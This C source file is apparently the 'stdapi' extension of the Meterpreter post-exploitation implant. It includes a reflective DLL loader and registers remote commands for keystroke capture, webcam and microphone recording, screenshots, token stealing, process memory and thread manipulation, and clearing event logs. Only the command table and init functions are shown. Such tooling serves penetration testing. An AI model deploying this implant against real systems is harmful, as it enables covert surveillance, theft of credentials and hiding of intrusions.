/*
 * This module provides access to the standard API of the machine in some
 * regards
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#ifdef _WIN32
 #include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#endif
// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

// General
extern DWORD request_general_channel_open(Remote *remote, Packet *packet);

Command customCommands[] =
{
	// General
	COMMAND_REQ("core_channel_open", request_general_channel_open),

#ifdef WIN32
	// Railgun
	COMMAND_REQ("stdapi_railgun_api", request_railgun_api),
	COMMAND_REQ("stdapi_railgun_api_multi", request_railgun_api_multi),
	COMMAND_REQ("stdapi_railgun_memread", request_railgun_memread),
	COMMAND_REQ("stdapi_railgun_memwrite", request_railgun_memwrite),
#endif

	// Fs
	COMMAND_REQ("stdapi_fs_ls", request_fs_ls),
	COMMAND_REQ("stdapi_fs_getwd", request_fs_getwd),
	COMMAND_REQ("stdapi_fs_chdir", request_fs_chdir),
	COMMAND_REQ("stdapi_fs_mkdir", request_fs_mkdir),
	COMMAND_REQ("stdapi_fs_delete_dir", request_fs_delete_dir),
	COMMAND_REQ("stdapi_fs_delete_file", request_fs_delete_file),
	COMMAND_REQ("stdapi_fs_separator", request_fs_separator),
	COMMAND_REQ("stdapi_fs_stat", request_fs_stat),
	COMMAND_REQ("stdapi_fs_file_expand_path", request_fs_file_expand_path),
	COMMAND_REQ("stdapi_fs_file_move", request_fs_file_move),
	COMMAND_REQ("stdapi_fs_md5", request_fs_md5),
	COMMAND_REQ("stdapi_fs_sha1", request_fs_sha1),
#ifdef _WIN32
	COMMAND_REQ("stdapi_fs_search", request_fs_search),
	COMMAND_REQ("stdapi_fs_mount_show", request_fs_mount_show),
#endif

	// Process
	COMMAND_REQ("stdapi_sys_process_attach", request_sys_process_attach),
	COMMAND_REQ("stdapi_sys_process_close", request_sys_process_close),
	COMMAND_REQ("stdapi_sys_process_execute", request_sys_process_execute),
	COMMAND_REQ("stdapi_sys_process_kill", request_sys_process_kill),
	COMMAND_REQ("stdapi_sys_process_get_processes", request_sys_process_get_processes),
	COMMAND_REQ("stdapi_sys_process_getpid", request_sys_process_getpid),
	COMMAND_REQ("stdapi_sys_process_get_info", request_sys_process_get_info),
	COMMAND_REQ("stdapi_sys_process_wait", request_sys_process_wait),

#ifdef _WIN32
	// Image
	COMMAND_REQ("stdapi_sys_process_image_load", request_sys_process_image_load),
	COMMAND_REQ("stdapi_sys_process_image_get_proc_address", request_sys_process_image_get_proc_address),
	COMMAND_REQ("stdapi_sys_process_image_unload", request_sys_process_image_unload),
	COMMAND_REQ("stdapi_sys_process_image_get_images", request_sys_process_image_get_images),

	// Memory
	COMMAND_REQ("stdapi_sys_process_memory_allocate", request_sys_process_memory_allocate),
	COMMAND_REQ("stdapi_sys_process_memory_free", request_sys_process_memory_free),
	COMMAND_REQ("stdapi_sys_process_memory_read", request_sys_process_memory_read),
	COMMAND_REQ("stdapi_sys_process_memory_write", request_sys_process_memory_write),
	COMMAND_REQ("stdapi_sys_process_memory_query", request_sys_process_memory_query),
	COMMAND_REQ("stdapi_sys_process_memory_protect", request_sys_process_memory_protect),
	COMMAND_REQ("stdapi_sys_process_memory_lock", request_sys_process_memory_lock),
	COMMAND_REQ("stdapi_sys_process_memory_unlock", request_sys_process_memory_unlock),

	// Thread
	COMMAND_REQ("stdapi_sys_process_thread_open", request_sys_process_thread_open),
	COMMAND_REQ("stdapi_sys_process_thread_create", request_sys_process_thread_create),
	COMMAND_REQ("stdapi_sys_process_thread_close", request_sys_process_thread_close),
	COMMAND_REQ("stdapi_sys_process_thread_get_threads", request_sys_process_thread_get_threads),
	COMMAND_REQ("stdapi_sys_process_thread_suspend", request_sys_process_thread_suspend),
	COMMAND_REQ("stdapi_sys_process_thread_resume", request_sys_process_thread_resume),
	COMMAND_REQ("stdapi_sys_process_thread_terminate", request_sys_process_thread_terminate),
	COMMAND_REQ("stdapi_sys_process_thread_query_regs", request_sys_process_thread_query_regs),
	COMMAND_REQ("stdapi_sys_process_thread_set_regs", request_sys_process_thread_set_regs),

	// Registry
	COMMAND_REQ("stdapi_registry_check_key_exists", request_registry_check_key_exists),
	COMMAND_REQ("stdapi_registry_load_key", request_registry_load_key),
	COMMAND_REQ("stdapi_registry_unload_key", request_registry_unload_key),
	COMMAND_REQ("stdapi_registry_open_key", request_registry_open_key),
	COMMAND_REQ("stdapi_registry_open_remote_key", request_registry_open_remote_key),
	COMMAND_REQ("stdapi_registry_create_key", request_registry_create_key),
	COMMAND_REQ("stdapi_registry_enum_key", request_registry_enum_key),
	COMMAND_REQ("stdapi_registry_delete_key", request_registry_delete_key),
	COMMAND_REQ("stdapi_registry_close_key", request_registry_close_key),
	COMMAND_REQ("stdapi_registry_set_value", request_registry_set_value),
	COMMAND_REQ("stdapi_registry_query_value", request_registry_query_value),
	COMMAND_REQ("stdapi_registry_query_class", request_registry_query_class),
	COMMAND_REQ("stdapi_registry_enum_value", request_registry_enum_value),
	COMMAND_REQ("stdapi_registry_delete_value", request_registry_delete_value),
	COMMAND_REQ("stdapi_registry_enum_key_direct", request_registry_enum_key_direct),
	COMMAND_REQ("stdapi_registry_enum_value_direct", request_registry_enum_value_direct),
	COMMAND_REQ("stdapi_registry_query_value_direct", request_registry_query_value_direct),
	COMMAND_REQ("stdapi_registry_set_value_direct", request_registry_set_value_direct),
#endif

	// Sys/config
	COMMAND_REQ("stdapi_sys_config_getuid", request_sys_config_getuid),
	COMMAND_REQ("stdapi_sys_config_sysinfo", request_sys_config_sysinfo),
	COMMAND_REQ("stdapi_sys_config_rev2self", request_sys_config_rev2self),
	COMMAND_REQ("stdapi_sys_config_getprivs", request_sys_config_getprivs),
	COMMAND_REQ("stdapi_sys_config_getenv", request_sys_config_getenv),
#ifdef _WIN32
	COMMAND_REQ("stdapi_sys_config_steal_token", request_sys_config_steal_token),
	COMMAND_REQ("stdapi_sys_config_drop_token", request_sys_config_drop_token),
	COMMAND_REQ("stdapi_sys_config_getsid", request_sys_config_getsid),
#endif

	// Net
	COMMAND_REQ("stdapi_net_config_get_routes", request_net_config_get_routes),
	COMMAND_REQ("stdapi_net_config_add_route", request_net_config_add_route),
	COMMAND_REQ("stdapi_net_config_remove_route", request_net_config_remove_route),
	COMMAND_REQ("stdapi_net_config_get_interfaces", request_net_config_get_interfaces),
	COMMAND_REQ("stdapi_net_config_get_arp_table", request_net_config_get_arp_table),
	COMMAND_REQ("stdapi_net_config_get_netstat", request_net_config_get_netstat),

#ifdef WIN32
	// Proxy
	COMMAND_REQ("stdapi_net_config_get_proxy", request_net_config_get_proxy_config),
	// Resolve
	COMMAND_REQ("stdapi_net_resolve_host", request_resolve_host),
	COMMAND_REQ("stdapi_net_resolve_hosts", request_resolve_hosts),
#endif

	// Socket
	COMMAND_REQ("stdapi_net_socket_tcp_shutdown", request_net_socket_tcp_shutdown),

#ifdef _WIN32
	// UI
	COMMAND_REQ("stdapi_ui_enable_mouse", request_ui_enable_mouse),
	COMMAND_REQ("stdapi_ui_enable_keyboard", request_ui_enable_keyboard),
	COMMAND_REQ("stdapi_ui_get_idle_time", request_ui_get_idle_time),
	COMMAND_REQ("stdapi_ui_start_keyscan", request_ui_start_keyscan),
	COMMAND_REQ("stdapi_ui_stop_keyscan", request_ui_stop_keyscan),
	COMMAND_REQ("stdapi_ui_get_keys", request_ui_get_keys),
	COMMAND_REQ("stdapi_ui_desktop_enum", request_ui_desktop_enum),
	COMMAND_REQ("stdapi_ui_desktop_get", request_ui_desktop_get),
	COMMAND_REQ("stdapi_ui_desktop_set", request_ui_desktop_set),
	COMMAND_REQ("stdapi_ui_desktop_screenshot", request_ui_desktop_screenshot),

	// Event Log
	COMMAND_REQ("stdapi_sys_eventlog_open", request_sys_eventlog_open),
	COMMAND_REQ("stdapi_sys_eventlog_numrecords", request_sys_eventlog_numrecords),
	COMMAND_REQ("stdapi_sys_eventlog_read", request_sys_eventlog_read),
	COMMAND_REQ("stdapi_sys_eventlog_oldest", request_sys_eventlog_oldest),
	COMMAND_REQ("stdapi_sys_eventlog_clear", request_sys_eventlog_clear),
	COMMAND_REQ("stdapi_sys_eventlog_close", request_sys_eventlog_close),

	// Power
	COMMAND_REQ("stdapi_sys_power_exitwindows", request_sys_power_exitwindows),

	// Webcam
	COMMAND_REQ("webcam_list", request_webcam_list),
	COMMAND_REQ("webcam_start", request_webcam_start),
	COMMAND_REQ("webcam_get_frame", request_webcam_get_frame),
	COMMAND_REQ("webcam_stop", request_webcam_stop),

	// Audio
	COMMAND_REQ("webcam_audio_record", request_ui_record_mic),

#endif
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
#ifdef _WIN32
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
#else
DWORD InitServerExtension(Remote *remote)
#endif
{
#ifdef _WIN32
	hMetSrv = remote->met_srv;
#endif
	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
#ifdef _WIN32
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
#else
DWORD DeinitServerExtension(Remote *remote)
#endif
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
#ifdef _WIN32
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
#else
DWORD GetExtensionName(char* buffer, int bufferSize)
#endif
{
#ifdef _WIN32
	strncpy_s(buffer, bufferSize, "stdapi", bufferSize - 1);
#else
	strncpy(buffer, "stdapi", bufferSize - 1);
#endif
	return ERROR_SUCCESS;
}
